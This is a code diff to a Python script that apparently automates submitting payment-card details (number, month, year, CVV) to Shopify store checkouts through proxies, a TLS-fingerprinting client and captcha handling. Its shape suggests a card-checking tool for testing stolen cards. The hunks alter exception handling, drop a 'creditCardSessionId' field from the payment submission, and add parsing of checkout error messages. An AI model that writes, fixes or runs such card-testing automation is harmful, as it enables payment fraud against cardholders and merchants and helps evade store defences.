@@ -575,7 +575,7 @@ async def make_graphql_request_with_captcha_handling(
             if attempt == max_retries:
                 return None, last_error, False
             await asyncio.sleep(1)
-        except (tls_requests.TLSError, tls_requests.RequestError, OSError) as e:
+        except (tls_requests.TLSError, tls_requests.HTTPError, OSError) as e:
             last_error = f"Request error: {str(e)}"
             if attempt == max_retries:
                 return None, last_error, False
@@ -668,7 +668,7 @@ async def fetch_products(domain, proxy_str=None):
         else:
             return False, "No valid products available"
 
-    except (tls_requests.TLSError, tls_requests.RequestError, OSError) as e:
+    except (tls_requests.TLSError, tls_requests.HTTPError, OSError) as e:
         return False, f"Proxy Error: {str(e)}"
     except Exception as e:
         return False, f"error: {str(e)}"
@@ -1947,17 +1947,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return False, f'PCI_VAULT_ERROR: Empty response (HTTP {vault_status}, hash={pci_build_hash})', gateway, total_price, currency
                 
                 token_data = json.loads(vault_text)
-                # FIX: PCI vault returns session identifier under 'id'.
-                # Modern Shopify requires 'creditCardSessionId' in the payment
-                # submission alongside 'sessionId'. The vault 'id' is the
-                # credit card session ID — if we only pass it as 'sessionId'
-                # without 'creditCardSessionId', Shopify returns
-                # "Missing credit card session information."
+                # PCI vault returns session identifier under 'id'.
                 # Try multiple possible keys for robustness:
                 #   - 'id' is the standard key from Shopify's PCI vault
-                #   - 'session_id' / 'creditCardSessionId' are alternate formats
-                token = token_data.get('id') or token_data.get('session_id') or token_data.get('creditCardSessionId')
-                credit_card_session_id = token_data.get('id')  # Always capture this for the submit mutation
+                #   - 'session_id' is an alternate format
+                token = token_data.get('id') or token_data.get('session_id')
                 if not token:
                     # Log the full vault response for debugging when token extraction fails
                     print(f"[PCI_VAULT] No token found in response. Keys: {list(token_data.keys())} Body: {vault_text[:200]}", file=sys.stderr)
@@ -2033,10 +2027,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 'directPaymentMethod': {
                                     'paymentMethodIdentifier': payment_identifier,
                                     'sessionId': token,
-                                    # FIX: Include creditCardSessionId from PCI vault.
-                                    # Without this field, Shopify returns
-                                    # "Missing credit card session information."
-                                    'creditCardSessionId': credit_card_session_id,
                                     'billingAddress': {
                                         'streetAddress': {
                                             'address1': street, 'address2': address2,
@@ -2136,6 +2126,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if "The requested payment method is not available." in text:
                 return False, "Payment method not available", gateway, total_price, currency
             
+            # If GraphQL request itself failed (HTML block, timeout, error), return early
+            if not _graphql_ok and not response:
+                return False, f"Submit request failed: {text}", gateway, total_price, currency
+            
             rid = None  # Initialize before try block to prevent NameError if no branch assigns it
             try:
                 resp_json = json.loads(text)
@@ -2144,10 +2138,20 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if not submit_data:
                     errors = resp_json.get('errors', [])
                     if errors:
+                        error_messages = []
                         for error in errors:
                             code = error.get('code')
+                            msg = error.get('message', '') or error.get('localizedMessage', '') or ''
                             if code:
                                 return False, code, gateway, total_price, currency
+                            if msg:
+                                error_messages.append(msg)
+                        if error_messages:
+                            return False, error_messages[0], gateway, total_price, currency
+                    
+                    if resp_json.get('data') is None and not errors:
+                        return False, "SERVER_ERROR: null data in submit response", gateway, total_price, currency
+                    
                     return False, "Empty submit response", gateway, total_price, currency
                 
                 result_type = submit_data.get('__typename', '')
@@ -2418,6 +2422,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
     except Exception as e:
         return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency
+
 def parse_cc_string(cc_string):
     parts = cc_string.split('|')
     if len(parts) != 4:
